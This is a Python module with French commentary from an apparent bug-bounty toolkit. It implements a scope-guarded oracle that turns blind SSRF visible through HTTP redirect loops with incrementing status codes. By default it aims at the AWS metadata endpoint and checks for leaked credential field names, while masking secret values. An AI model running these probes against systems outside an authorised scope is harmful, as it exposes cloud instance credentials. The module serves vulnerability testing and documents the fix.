"""Oracle A PREUVE du SSRF AVEUGLE RENDU VISIBLE — `ssrf.redirect_loop`.

D'OU VIENT CETTE TECHNIQUE, ET POURQUOI ELLE CHANGE UNE REGLE CHEZ NOUS
------------------------------------------------------------------------
« Novel SSRF Technique Involving HTTP Redirect Loops », Shubham Shah (Searchlight Cyber) —
3e du Top 10 des techniques web 2025 de PortSwigger.

Notre doctrine range le « blind SSRF sans exfiltration » parmi les classes NON QUALIFIANTES,
et elle a raison de le faire : un SSRF dont on ne rapporte aucune reponse est un informatif.
Cette technique deplace la frontiere — elle rend la reponse VISIBLE, donc elle fait passer la
meme decouverte du cote payable. C'est la premiere fois qu'une lecture de veille nous fait
recuperer une classe que nous avions abandonnee, plutot que d'en ajouter une.

LE MECANISME. Beaucoup d'applications ne renvoient pas le corps d'une reponse obtenue avec
SUCCES, mais deviennent bavardes en cas d'ERREUR. On enchaine donc des redirections dont le
code AUGMENTE a chaque saut — 302, 303, 304, … 310, 311 — jusqu'a sortir des codes que le
client HTTP de la cible sait traiter. Il entre alors en erreur et divulgue la chaine complete,
y compris la reponse finale a 200 du service interne.

Le collecteur `toolkit/oast/oast_server.py` sert la boucle sur `/_redir`.

CE QUE CET ORACLE PROUVE — TROIS POINTS, ET UNE RETENUE
--------------------------------------------------------
  1. ATTEINTE   : la cible suit-elle bien notre URL ? (le jeton apparait dans `/_hits`)
  2. AVEUGLEMENT: la sonde DIRECTE vers l'interne ne rapporte rien d'identifiable — c'est ce
                  qui rend la classe informative en l'etat.
  3. VISIBILITE : la sonde en BOUCLE, elle, fait apparaitre du contenu interne identifiable.

PREUVE = les trois. Le point 2 est indispensable : sans lui, on ne saurait pas si la boucle a
apporte quoi que ce soit, et l'on s'attribuerait un resultat que la sonde directe donnait deja.

⚠️ RETENUE. Viser un point de metadonnees cloud, c'est frôler des IDENTIFIANTS. L'evidence de
cet oracle est donc MASQUEE : elle nomme les champs structurels reconnus (`instance-id`,
`iam`, `computeMetadata`…) et NE RECOPIE JAMAIS de valeur — tout ce qui ressemble a une cle ou
a un jeton est remplace avant d'entrer dans un finding. Prouver que la reponse interne fuit
n'exige pas de transporter son contenu.
"""
from __future__ import annotations

import hashlib
import re
import urllib.parse

from .oracle import ScopeGuardedOracle
from .registry import register
from .. import techniques

# Champs STRUCTURELS des points de metadonnees des grands fournisseurs. Ce sont des NOMS de
# champs, jamais des valeurs : leur presence atteste que la reponse interne a fuite, sans qu'on
# ait besoin d'en recopier quoi que ce soit.
MARQUEURS_INTERNES = (
    "ami-id", "instance-id", "instance-type", "iam/security-credentials",
    "AccessKeyId", "SecretAccessKey", "Token",                 # AWS (noms seuls)
    "computeMetadata", "service-accounts",                     # GCP
    "Microsoft.Compute", "azEnvironment",                      # Azure
    "hostname", "local-ipv4", "public-keys",
)

# Motifs de SECRETS a masquer avant toute entree dans un finding.
_SECRETS = [
    (re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "[CLE-AWS-MASQUEE]"),
    (re.compile(r"\bASIA[0-9A-Z]{16}\b"), "[CLE-AWS-TEMP-MASQUEE]"),
    (re.compile(r'"SecretAccessKey"\s*:\s*"[^"]+"'), '"SecretAccessKey":"[MASQUE]"'),
    (re.compile(r'"Token"\s*:\s*"[^"]+"'), '"Token":"[MASQUE]"'),
    (re.compile(r"\bey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}"), "[JWT-MASQUE]"),
    (re.compile(r"\b[A-Za-z0-9/+=]{40,}\b"), "[CHAINE-LONGUE-MASQUEE]"),
]

MAX_EVIDENCE = 400        # borne DURE de l'extrait porte dans un finding


def masquer(texte):
    """Retire d'un extrait tout ce qui ressemble a un secret, AVANT qu'il entre dans un finding.

    Un rapport de bug bounty circule : il est lu par le triage, archive, parfois joint a un
    ticket. Y faire figurer une cle d'acces temporaire reviendrait a la diffuser plus largement
    que ne l'a fait la vulnerabilite elle-meme. On nomme les champs, on ne recopie pas les
    valeurs — et le masquage est applique meme aux chaines longues non reconnues, par defaut.
    """
    out = texte or ""
    for rx, remplacement in _SECRETS:
        out = rx.sub(remplacement, out)
    return out[:MAX_EVIDENCE]


def marqueurs_presents(corps):
    """Champs structurels internes reconnus dans une reponse. Renvoie des NOMS, jamais des valeurs."""
    bas = (corps or "").lower()
    return [m for m in MARQUEURS_INTERNES if m.lower() in bas]


def loop_url(base, token, dest, sauts):
    """URL de la boucle servie par le collecteur OAST (`/_redir`)."""
    return (f"{base.rstrip('/')}/_redir?t={urllib.parse.quote(token)}&n=0"
            f"&to={urllib.parse.quote(dest, safe='')}&max={int(sauts)}")


# --- Enregistrement de la technique ---------------------------------------------------------------
# Classe `ssrf` : c'est bien un SSRF, et le rattacher ailleurs le sortirait du plancher
# anti-famine qui protege deja cette classe dans le planner.
techniques.register_kind(techniques._k(
    "ssrf.redirect_loop", "SSRF", True, depends_on=("recon.forms",),
    cls="ssrf", cwe="CWE-918", mitre="T1190", exploit=False,
    attck_tactic="Discovery", phase="access", capability="active",
    proof_required=True))


@register("ssrf.redirect_loop")
class SsrfRedirectLoop(ScopeGuardedOracle):
    kind = "ssrf.redirect_loop"
    exploit = False              # aucune charge active : on fait suivre des redirections
    destructive = False          # lectures seules du cote interne
    web_allowed = True
    available = True
    category = "ssrf"
    cwe = "CWE-918"
    mitre = techniques.mitre_for("ssrf.redirect_loop") or "T1190"
    tool = "forge/modules/ssrfloop.py:ssrf.redirect_loop"
    description = ("Rend VISIBLE un SSRF aveugle par une boucle de redirection a codes "
                   "incrementaux (302, 303, … 311), qui pousse le client HTTP de la cible hors "
                   "des codes qu'il sait traiter : il entre en erreur et divulgue la chaine, "
                   "reponse interne comprise. Preuve a trois points — atteinte, aveuglement de "
                   "la sonde directe, visibilite par la boucle — et evidence MASQUEE.")
    fix = ("Ne jamais suivre de redirection sur une requete sortante initiee a partir d'une URL "
           "fournie par l'utilisateur ; si le suivi est indispensable, RE-VALIDER la destination "
           "a CHAQUE saut contre une liste blanche, et borner le nombre de sauts. Ne jamais "
           "renvoyer au client le corps ni le detail d'erreur d'une requete sortante — c'est ce "
           "canal d'erreur, et non le succes, qui transforme un SSRF aveugle en fuite complete.")

    def _send(self, action, param, valeur, timeout):
        url, data = self.inject_request(str(action.target), param, valeur,
                                        str(action.params.get("method", "GET")).upper(),
                                        body_template=action.params.get("body_template"))
        st, body, _h = self._http(url, headers=dict(action.params.get("headers", {})),
                                  timeout=timeout,
                                  method=str(action.params.get("method", "GET")).upper(), data=data)
        return st, (body or "")

    def _atteste(self, action, token, timeout):
        """Le collecteur a-t-il vu passer notre jeton ? Meme contrat que `ssrf.callback`."""
        check = action.params.get("callback_check_url")
        if not check:
            return None
        st, body, _h = self._http(str(check), headers={}, timeout=timeout, method="GET")
        return bool(st == 200 and token in (body or ""))

    def dry(self, action):
        dest = action.params.get("internal_target", "http://169.254.169.254/latest/meta-data/")
        return (f"# 2 sondes sur {action.target} (parametre `{action.params.get('param','url')}`) :\n"
                f"#   directe  -> {dest}                    : rapporte-t-elle quelque chose ?\n"
                f"#   boucle   -> {{callback_base}}/_redir?...&to={dest}&max=N\n"
                f"#              codes 302,303,…311 puis 302 vers la cible interne\n"
                f"# PREUVE = du contenu interne identifiable apparait avec la BOUCLE et pas sans. "
                f"Evidence MASQUEE : les champs sont nommes, les valeurs jamais recopiees.")

    def fire(self, action):
        target = str(action.target)
        if not self._in_scope(action, target):
            return [self.skip(target=target,
                              title="SSRF en boucle non sonde — hors perimetre (fail-closed)",
                              evidence="Aucune requete emise.", poc=self.dry(action))]

        param = action.params.get("param")
        base = action.params.get("callback_base")
        if not param or not base:
            return [self.skip(
                target=target, title="SSRF en boucle non sonde — config manquante",
                evidence=("`params.param` (le champ qui porte l'URL) et `params.callback_base` "
                          "(le collecteur OAST, qui sert la boucle sur /_redir) sont REQUIS. "
                          "Lancer : python3 toolkit/oast/oast_server.py --port 8081 "
                          "--base-url https://oast.exemple.test. Optionnels : `internal_target` "
                          "(defaut le point de metadonnees AWS), `max_redirects` (defaut 10), "
                          "`callback_check_url` pour attester l'atteinte."),
                poc=self.dry(action))]

        try:
            timeout = max(1, min(int(action.params.get("timeout", 20)), 60))
            sauts = max(1, min(int(action.params.get("max_redirects", 10)), 15))
        except (TypeError, ValueError):
            timeout, sauts = 20, 10
        dest = str(action.params.get("internal_target",
                                     "http://169.254.169.254/latest/meta-data/"))
        token = "forgeloop" + hashlib.sha256(f"{target}|{param}".encode()).hexdigest()[:8]

        # (2) AVEUGLEMENT — la sonde DIRECTE rapporte-t-elle deja quelque chose ?
        st_d, b_d = self._send(action, param, dest, timeout)
        if st_d is None:
            return [self.degraded(
                target=target, title="SSRF en boucle non verifie — reseau indisponible",
                evidence="Aucune reponse a la sonde directe ; offline-safe.", poc=self.dry(action))]
        directs = marqueurs_presents(b_d)

        # (3) VISIBILITE — la meme cible, atteinte par la boucle a codes incrementaux.
        st_b, b_b = self._send(action, param, loop_url(base, token, dest, sauts), timeout)
        if st_b is None:
            return [self.degraded(
                target=target, title="SSRF en boucle non verifie — sonde en boucle sans reponse",
                evidence=f"La sonde directe a repondu (HTTP {st_d}) mais la boucle n'a rien rendu ; "
                         f"aucune conclusion tiree.", poc=self.dry(action))]
        boucle = marqueurs_presents(b_b)

        # (1) ATTEINTE — le collecteur a-t-il vu passer le jeton ?
        atteint = self._atteste(action, token, timeout)
        note_atteinte = ("atteinte ATTESTEE par le collecteur" if atteint is True else
                         "atteinte NON attestee (le jeton n'apparait pas dans /_hits)"
                         if atteint is False else
                         "atteinte non verifiee (`callback_check_url` non fourni)")

        nouveaux = [m for m in boucle if m not in directs]
        if nouveaux:
            return [self.proof(
                target=target, proven=True, severity="HIGH",
                title=(f"SSRF AVEUGLE RENDU VISIBLE — {len(nouveaux)} champ(s) internes "
                       f"apparaissent via la boucle : {', '.join(nouveaux)}"),
                evidence=(f"Sonde DIRECTE vers {dest} : HTTP {st_d}, champs internes reconnus="
                          f"{directs or 'aucun'} — c'est l'etat aveugle, celui qui rend la classe "
                          f"informative. Sonde en BOUCLE ({sauts} sauts, codes 302 a "
                          f"{301 + sauts}) : HTTP {st_b}, champs internes reconnus={boucle}. "
                          f"{note_atteinte}. Les champs listes n'apparaissaient PAS sans la boucle : "
                          f"le client HTTP de la cible, pousse hors des codes 3xx qu'il sait "
                          f"traiter, a divulgue la chaine et la reponse interne. Extrait MASQUE : "
                          f"{masquer(b_b)!r}. ⚠️ Aucune valeur de secret n'est recopiee ici — les "
                          f"champs sont nommes, les valeurs remplacees. Reference : Shubham Shah, "
                          f"« Novel SSRF Technique Involving HTTP Redirect Loops », 3e du Top 10 "
                          f"PortSwigger 2025."),
                poc=self.dry(action))]

        if directs:
            return [self.proof(
                target=target, proven=True, severity="HIGH",
                title=f"SSRF DEJA VISIBLE sans boucle — {len(directs)} champ(s) internes rapportes",
                evidence=(f"La sonde DIRECTE vers {dest} rapporte deja {directs} (HTTP {st_d}). La "
                          f"boucle n'etait pas necessaire — et c'est une meilleure nouvelle pour le "
                          f"rapport : la chaine d'exploitation est plus courte. Extrait MASQUE : "
                          f"{masquer(b_d)!r}."),
                poc=self.dry(action))]

        return [self.proof(
            target=target, proven=False, severity="INFO",
            title="SSRF non rendu visible par la boucle de redirection",
            evidence=(f"Sonde directe HTTP {st_d}, sonde en boucle HTTP {st_b} ({sauts} sauts) : "
                      f"aucun champ interne identifiable dans l'une ou l'autre. {note_atteinte}. "
                      f"Lecture prudente : soit il n'y a pas de SSRF, soit la cible ne suit pas les "
                      f"redirections, soit son client HTTP tolere les codes eleves sans se plaindre. "
                      f"Faire varier `max_redirects` et `internal_target` avant de conclure — et si "
                      f"l'atteinte n'est pas attestee, c'est cette question-la qu'il faut trancher "
                      f"d'abord."),
            poc=self.dry(action))]
